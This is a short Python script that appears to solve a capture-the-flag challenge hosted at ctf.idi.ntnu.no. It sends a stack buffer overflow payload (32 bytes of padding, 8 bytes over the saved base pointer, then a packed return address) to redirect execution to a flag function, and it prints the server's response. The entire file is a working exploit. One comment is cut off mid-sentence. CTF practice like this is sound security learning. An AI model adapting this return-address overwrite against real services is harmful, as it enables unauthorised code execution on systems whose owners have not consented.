import socket
import time
from struct import pack


HOST = "ctf.idi.ntnu.no"  # Replace with actual host
PORT = 5009        # Replace with actual port

try:
    
    offset = 40
    flag_addr = 0x401192  # replace with actual address

    payload = b"A" * 32           # buffer
    payload += b"B" * 8           # saved rbp
    payload += pack("<Q", flag_addr)  # overwrite return addr (little-endian 64-bit)

    print(f"\nPayload sent to server: \n{payload}")

    s = socket.socket()
    s.connect((HOST, PORT))
    s.sendall(payload + b"\n")

    time.sleep(0.5) # necessary sleep so that response is 

    response = s.recv(1024).decode(errors="ignore")

    print(f"\nResponse from server: \n{response}")

    s.close()

except Exception as e:
    print(f"Connection error: {e}")
    
